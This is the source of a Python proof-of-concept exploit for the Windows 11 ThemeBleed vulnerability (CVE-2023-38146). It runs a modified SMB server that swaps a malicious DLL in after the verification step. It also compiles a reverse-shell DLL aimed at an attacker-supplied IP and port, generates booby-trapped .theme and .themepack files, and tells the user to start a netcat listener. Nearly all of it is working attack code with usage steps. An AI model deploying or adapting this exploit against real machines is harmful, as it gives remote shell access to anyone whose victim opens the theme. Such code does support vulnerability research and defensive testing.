# >> PoC for the ThemeBleed CVE-2023-38146 exploit (Windows 11 Themes)
#
# Heavily inspired by https://github.com/gabe-k/themebleed which only runs on windows (the reason why i decided to write this).
# Used modified code from the impacket smbserver.py (https://github.com/fortra/impacket/blob/master/impacket/smbserver.py)
# Useful stuff: https://github.com/TalAloni/SMBLibrary/blob/master/SMBLibrary/NTFileStore/Enums/NtCreateFile/ShareAccess.cs
#
# - How to use this:
# Place a DLL with an exported function "VerifyThemeVersion" in the 
# "./td/" folder named "Aero.msstyles_vrf_evil.dll"
#
# pip3 install -r requirements.txt
# python3 themebleed.py -r RHOST
#
# Use the "evil_theme.theme" or "evil_theme.themepack"
#
# Profit!

import argparse
import os
import sys
import socket
import logging as logger
from pathlib import Path

from cabarchive import CabArchive, CabFile
from impacket import smb, uuid
from impacket import smb3structs as smb2
from impacket.smbserver import SimpleSMBServer, normalize_path, isInFileJail, queryPathInformation, PIPE_FILE_DESCRIPTOR, STATUS_SMB_BAD_TID
from impacket.nt_errors import *


class TBSmbServer(SimpleSMBServer):
    def __init__(self, address: str, port: int, no_smb2: bool = False) -> None:
        SimpleSMBServer.__init__(self, address, port)
 
        # replace SMB2_CREATE handler to replace the good dll with the evil dll on the fly
        self._SimpleSMBServer__server._SMBSERVER__smb2Commands[smb2.SMB2_CREATE] = self.tbSmb2Create

        self.server_folder = "./tb/"

        if not Path(self.server_folder).exists():
            os.makedirs(self.server_folder)

        self.setSMB2Support(not no_smb2)
        self.addShare("tb", self.server_folder)
        self.default_share = "tb"

    # copied and modified version from https://github.com/fortra/impacket/blob/master/impacket/smbserver.py
    def tbSmb2Create(self, connId, smbServer, recvPacket):
        connData = smbServer.getConnectionData(connId)
        respSMBCommand = smb2.SMB2Create_Response()
        ntCreateRequest = smb2.SMB2Create(recvPacket['Data'])

        respSMBCommand['Buffer'] = b'\x00'
        # Get the Tid associated
        if recvPacket['TreeID'] in connData['ConnectedShares']:
            # If we have a rootFid, the path is relative to that fid
            errorCode = STATUS_SUCCESS
            if 'path' in connData['ConnectedShares'][recvPacket['TreeID']]:
                path = connData['ConnectedShares'][recvPacket['TreeID']]['path']
            else:
                path = 'NONE'
                errorCode = STATUS_ACCESS_DENIED

            deleteOnClose = False

            fileName = normalize_path(ntCreateRequest['Buffer'][:ntCreateRequest['NameLength']].decode('utf-16le'))

            # patch the sending of the dll file
            try:
                shareAccess = ntCreateRequest["ShareAccess"]

                if fileName.endswith(".msstyles"):
                    logger.warning(f"Stage 1/3: \033[1;36m\"{fileName}\"\033[0m [shareAccess: \033[1;32m{shareAccess}\033[0m]")
                    # fileName = "Aero.msstyles"
                elif fileName.endswith("_vrf.dll"):
                    if shareAccess != 0x5:
                        logger.warning(f"Stage 2/3: \033[1;33m\"{fileName}\"\033[0m [shareAccess: \033[1;32m{shareAccess}\033[0m]")
                        # fileName = "Aero.msstyles_vrf.dll"
                    else:
                        logger.warning(f"Stage 3/3: \033[1;31m\"{fileName}\"\033[0m [shareAccess: \033[1;32m{shareAccess}\033[0m]")
                        fileName = "Aero.msstyles_vrf_evil.dll"
                        
            except Exception as ex:
                logger.error(f"tbSmb2Create: {ex}")

            if not isInFileJail(path, fileName):
                return [smb2.SMB2Error()], None, STATUS_OBJECT_PATH_SYNTAX_BAD

            pathName = os.path.join(path, fileName)
            createDisposition = ntCreateRequest['CreateDisposition']
            mode = 0

            if createDisposition == smb2.FILE_SUPERSEDE:
                mode |= os.O_TRUNC | os.O_CREAT
            elif createDisposition & smb2.FILE_OVERWRITE_IF == smb2.FILE_OVERWRITE_IF:
                mode |= os.O_TRUNC | os.O_CREAT
            elif createDisposition & smb2.FILE_OVERWRITE == smb2.FILE_OVERWRITE:
                if os.path.exists(pathName) is True:
                    mode |= os.O_TRUNC
                else:
                    errorCode = STATUS_NO_SUCH_FILE
            elif createDisposition & smb2.FILE_OPEN_IF == smb2.FILE_OPEN_IF:
                mode |= os.O_CREAT
            elif createDisposition & smb2.FILE_CREATE == smb2.FILE_CREATE:
                if os.path.exists(pathName) is True:
                    errorCode = STATUS_OBJECT_NAME_COLLISION
                else:
                    mode |= os.O_CREAT
            elif createDisposition & smb2.FILE_OPEN == smb2.FILE_OPEN:
                if os.path.exists(pathName) is not True and (
                        str(pathName) in smbServer.getRegisteredNamedPipes()) is not True:
                    errorCode = STATUS_NO_SUCH_FILE

            if errorCode == STATUS_SUCCESS:
                desiredAccess = ntCreateRequest['DesiredAccess']
                if (desiredAccess & smb2.FILE_READ_DATA) or (desiredAccess & smb2.GENERIC_READ):
                    mode |= os.O_RDONLY
                if (desiredAccess & smb2.FILE_WRITE_DATA) or (desiredAccess & smb2.GENERIC_WRITE):
                    if (desiredAccess & smb2.FILE_READ_DATA) or (desiredAccess & smb2.GENERIC_READ):
                        mode |= os.O_RDWR  # | os.O_APPEND
                    else:
                        mode |= os.O_WRONLY  # | os.O_APPEND
                if desiredAccess & smb2.GENERIC_ALL:
                    mode |= os.O_RDWR  # | os.O_APPEND

                createOptions = ntCreateRequest['CreateOptions']
                if mode & os.O_CREAT == os.O_CREAT:
                    if createOptions & smb2.FILE_DIRECTORY_FILE == smb2.FILE_DIRECTORY_FILE:
                        try:
                            # Let's create the directory
                            os.mkdir(pathName)
                            mode = os.O_RDONLY
                        except Exception as e:
                            errorCode = STATUS_ACCESS_DENIED
                if createOptions & smb2.FILE_NON_DIRECTORY_FILE == smb2.FILE_NON_DIRECTORY_FILE:
                    # If the file being opened is a directory, the server MUST fail the request with
                    # STATUS_FILE_IS_A_DIRECTORY in the Status field of the SMB Header in the server
                    # response.
                    if os.path.isdir(pathName) is True:
                        errorCode = STATUS_FILE_IS_A_DIRECTORY

                if createOptions & smb2.FILE_DELETE_ON_CLOSE == smb2.FILE_DELETE_ON_CLOSE:
                    deleteOnClose = True

                if errorCode == STATUS_SUCCESS:
                    try:
                        if os.path.isdir(pathName) and sys.platform == 'win32':
                            fid = VOID_FILE_DESCRIPTOR
                        else:
                            if sys.platform == 'win32':
                                mode |= os.O_BINARY
                            if str(pathName) in smbServer.getRegisteredNamedPipes():
                                fid = PIPE_FILE_DESCRIPTOR
                                sock = socket.socket()
                                sock.connect(smbServer.getRegisteredNamedPipes()[str(pathName)])
                            else:
                                fid = os.open(pathName, mode)
                    except Exception as e:
                        # print e
                        fid = 0
                        errorCode = STATUS_ACCESS_DENIED
        else:
            errorCode = STATUS_SMB_BAD_TID

        if errorCode == STATUS_SUCCESS:
            # Simple way to generate a fid
            fakefid = uuid.generate()

            respSMBCommand['FileID'] = fakefid
            respSMBCommand['CreateAction'] = createDisposition

            if fid == PIPE_FILE_DESCRIPTOR:
                respSMBCommand['CreationTime'] = 0
                respSMBCommand['LastAccessTime'] = 0
                respSMBCommand['LastWriteTime'] = 0
                respSMBCommand['ChangeTime'] = 0
                respSMBCommand['AllocationSize'] = 4096
                respSMBCommand['EndOfFile'] = 0
                respSMBCommand['FileAttributes'] = 0x80

            else:
                if os.path.isdir(pathName):
                    respSMBCommand['FileAttributes'] = smb.SMB_FILE_ATTRIBUTE_DIRECTORY
                else:
                    respSMBCommand['FileAttributes'] = ntCreateRequest['FileAttributes']
                # Let's get this file's information
                respInfo, errorCode = queryPathInformation(path, fileName, level=smb.SMB_QUERY_FILE_ALL_INFO)
                if errorCode == STATUS_SUCCESS:
                    respSMBCommand['CreationTime'] = respInfo['CreationTime']
                    respSMBCommand['LastAccessTime'] = respInfo['LastAccessTime']
                    respSMBCommand['LastWriteTime'] = respInfo['LastWriteTime']
                    respSMBCommand['LastChangeTime'] = respInfo['LastChangeTime']
                    respSMBCommand['FileAttributes'] = respInfo['ExtFileAttributes']
                    respSMBCommand['AllocationSize'] = respInfo['AllocationSize']
                    respSMBCommand['EndOfFile'] = respInfo['EndOfFile']

            if errorCode == STATUS_SUCCESS:
                # Let's store the fid for the connection
                # smbServer.log('Create file %s, mode:0x%x' % (pathName, mode))
                connData['OpenedFiles'][fakefid] = {}
                connData['OpenedFiles'][fakefid]['FileHandle'] = fid
                connData['OpenedFiles'][fakefid]['FileName'] = pathName
                connData['OpenedFiles'][fakefid]['DeleteOnClose'] = deleteOnClose
                connData['OpenedFiles'][fakefid]['Open'] = {}
                connData['OpenedFiles'][fakefid]['Open']['EnumerationLocation'] = 0
                connData['OpenedFiles'][fakefid]['Open']['EnumerationSearchPattern'] = ''
                if fid == PIPE_FILE_DESCRIPTOR:
                    connData['OpenedFiles'][fakefid]['Socket'] = sock
        else:
            respSMBCommand = smb2.SMB2Error()

        if errorCode == STATUS_SUCCESS:
            connData['LastRequest']['SMB2_CREATE'] = respSMBCommand
        smbServer.setConnectionData(connId, connData)

        return [respSMBCommand], None, errorCode


if __name__ == "__main__":
    logger.basicConfig(format="\r%(asctime)s %(levelname)s> %(message)s", level=logger.DEBUG)

    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--host", dest="ipaddress", help="IP Address of the rev shell host", type=str, required=True)
    parser.add_argument("-p", "--port", dest="port", help="Port of the rev shell host", type=int, default=4711)
    parser.add_argument("-n", "--no-dll", dest="nodll", help="Don't use the built in dll", action='store_true')
    parser.add_argument("--x86", dest="x86", help="Compile dll as 32bit", action='store_true')

    args = parser.parse_args()

    logger.info("ThemeBleed CVE-2023-38146 PoC [\033[1;36mhttps://github.com/Jnnshschl\033[0m]")
    logger.info("Credits to -> \033[1;33mhttps://github.com/gabe-k/themebleed\033[0m, \033[1;33mimpacket\033[0m and \033[1;33mcabarchive\033[0m\n")

    # compile rev_shell.cpp
    if not args.nodll:
        compiler = "i686-w64-mingw32-g++" if args.x86 else "x86_64-w64-mingw32-g++"
        dll_source = "./rev_shell_template.cpp"
        dll_source_mod = "./rev_shell.cpp"
        dll_path = "./tb/Aero.msstyles_vrf_evil.dll"
        dll_args = f"{dll_source_mod} -shared -lws2_32 -o {dll_path}"

        try:
            with open(dll_source) as dll_source_template_file:
                with open(dll_source_mod, "w+") as dll_source_file:
                    source = dll_source_template_file.read().replace("{{IP_ADDR}}", args.ipaddress).replace("{{PORT}}", str(args.port))
                    dll_source_file.write(source)

            compile_result = os.system(f"{compiler} {dll_args}")

            if compile_result == 0 and Path(dll_path).exists():
                logger.info(f"Compiled DLL: \033[1;36m\"{dll_path}\"\033[0m")
            else:
                logger.error(f"Failed to build DLL using ({compiler}): \033[1;31m{compile_result}\033[0m")
                logger.error(f"-> {compiler} {dll_args}")
                exit(1)
        finally:
            if Path(dll_source_mod).exists():
                os.remove(dll_source_mod)

    # generate theme and themepack
    with open("./theme_template.theme") as theme_template:
        with open("./evil_theme.theme", "w+") as evil_theme:
            tt = theme_template.read().replace("{{IP_ADDR}}", args.ipaddress)
            evil_theme.write(tt)

        arc = CabArchive()
        arc["evil_theme.theme"] = CabFile(tt.encode())

        logger.info("Theme generated: \033[1;36m\"evil_theme.theme\"\033[0m") 

        with open("evil_theme.themepack", "wb") as evil_themepack:
            evil_themepack.write(arc.save())
            logger.info("Themepack generated: \033[1;36m\"evil_theme.themepack\"\033[0m\n")

    logger.info(f"Remember to start netcat: \033[1;32mrlwrap -cAr nc -lvnp {args.port}\033[0m")
    logger.info(f"Starting SMB server: \033[1;32m{args.ipaddress}:445\033[0m\n")

    TBSmbServer(args.ipaddress, 445).start()

